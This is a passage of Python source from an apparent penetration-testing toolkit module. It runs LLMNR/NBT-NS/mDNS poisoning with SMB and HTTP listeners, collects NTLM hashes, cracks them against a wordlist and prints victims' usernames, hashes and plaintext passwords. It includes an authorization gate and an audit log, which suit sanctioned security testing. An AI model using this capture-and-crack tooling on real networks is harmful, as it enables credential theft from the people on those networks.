        error("poison: could not determine default interface")
        return {}

    state.iface = iface
    state.my_ip = my_ip
    state.my_mac = my_mac

    info(f"poison: interface={iface} ip={my_ip} mac={my_mac}")

    # Authorization gate
    if active:
        allowed, reason = _check_authorization(authorized_by or "")
        if allowed:
            state.active = True
            state.authorized_by = authorized_by
            info(f"poison: ACTIVE mode enabled, authorized by "
                 f"{authorized_by!r}")
            _audit_log(state,
                       f"session start: active mode, duration={duration}s, "
                       f"authorized_by={authorized_by!r}, iface={iface}, "
                       f"our_ip={my_ip}")
            warn("poison: ACTIVE MODE — sending LLMNR/NBT-NS poison "
                 "responses. This is an attack.")
        else:
            if passive_only_ok:
                warn(f"poison: active mode refused ({reason}); "
                     f"falling back to passive")
                state.active = False
            else:
                error(f"poison: active mode refused: {reason}")
                return {}

    # Start SMB + HTTP listeners (only in active mode)
    smb = http = None
    if state.active:
        smb = SMBListener(state, port=smb_port, verbose=verbose)
        http = HTTPListener(state, port=http_port, verbose=verbose)
        if not smb.start():
            warn("poison: SMB listener failed; NTLM-over-SMB disabled")
            smb = None
        if not http.start():
            warn("poison: HTTP listener failed; NTLM-over-HTTP disabled")
            http = None

    info(f"poison: sniffing for {duration}s "
         f"({'ACTIVE' if state.active else 'passive'})")
    try:
        await _sniff_loop(state, duration, verbose)
    finally:
        if smb:
            smb.stop()
        if http:
            http.stop()

    if store is not None:
        _persist(state, store)

    cracked: dict[str, str] = {}
    if wordlist:
        cracked = _crack_hashes(state, wordlist, verbose=verbose)

    _print_summary(state, cracked)

    if state.active:
        _audit_log(state,
                   f"session end: {len(state.captures)} captures, "
                   f"{len(state.captured_from)} hash(es) from "
                   f"{len(state.captured_from)} victim(s)")

    return {
        "captures": state.captures,
        "cracked": cracked,
        "my_ip": my_ip,
        "iface": iface,
    }


def _print_summary(state: PoisonState, cracked: dict):
    print()
    llmnr = sum(1 for c in state.captures if c.kind == "llmnr-query")
    nbns = sum(1 for c in state.captures if c.kind == "nbns-query")
    mdns = sum(1 for c in state.captures if c.kind == "mdns-query")
    poisoned = sum(1 for c in state.captures if c.poisoned)
    hashes = [c for c in state.captures if c.kind == "ntlm-hash"]

    success("poison: session summary")
    print(f"  LLMNR queries:  {llmnr}")
    print(f"  NBT-NS queries: {nbns}")
    print(f"  mDNS queries:   {mdns}")
    print(f"  Poisoned:       {poisoned}")
    print(f"  NTLM hashes:    {len(hashes)}")

    if hashes:
        print()
        success("Captured NTLM hashes:")
        for c in hashes:
            tag = " (cracked)" if c.ntlmv2_hash in cracked else ""
            print(f"  {c.src_ip:18s} {c.domain}\\{c.username}{tag}")
            print(f"    {c.ntlmv2_hash}")
            if c.ntlmv2_hash in cracked:
                print(f"    → plaintext: {cracked[c.ntlmv2_hash]!r}")

    if state.active:
        print()
        warn("audit log entry written to loot/poison_audit.log")


# ---------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------

def _cli():
    import argparse
    p = argparse.ArgumentParser(
        prog="net.poison",
        description=("LLMNR / NBT-NS / mDNS capture. Passive by default, "
                     "active poisoning with --active and --authorized-by."),
    )
    p.add_argument("--duration", "-d", type=int, default=60)
    p.add_argument("--active", action="store_true")
    p.add_argument("--authorized-by", default=None)
    p.add_argument("--interface", "-i", default=None)
    p.add_argument("--smb-port", type=int, default=SMB_PORT)
    p.add_argument("--http-port", type=int, default=HTTP_PORT)
    p.add_argument("--wordlist", default=None)
    p.add_argument("--store", action="store_true")
    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()

    store = None
    workspace = None
    if args.store:
        from core.workspace import get_active, get_workspace
        from core.store import open_store
        active = get_active()
        if not active:
            warn("no active workspace; "
                 "use `toolkit workspace switch <name>` first")
            return
        workspace = get_workspace(active)
        store = open_store(workspace.db_path, workspace_name=active)

    asyncio.run(run(
        duration=args.duration,
        active=args.active,
        authorized_by=args.authorized_by,
        interface=args.interface,
        verbose=args.verbose,
        wordlist=args.wordlist,
        store=store,
        workspace=workspace,
        smb_port=args.smb_port,
        http_port=args.http_port,
    ))


if __name__ == "__main__":
    _cli()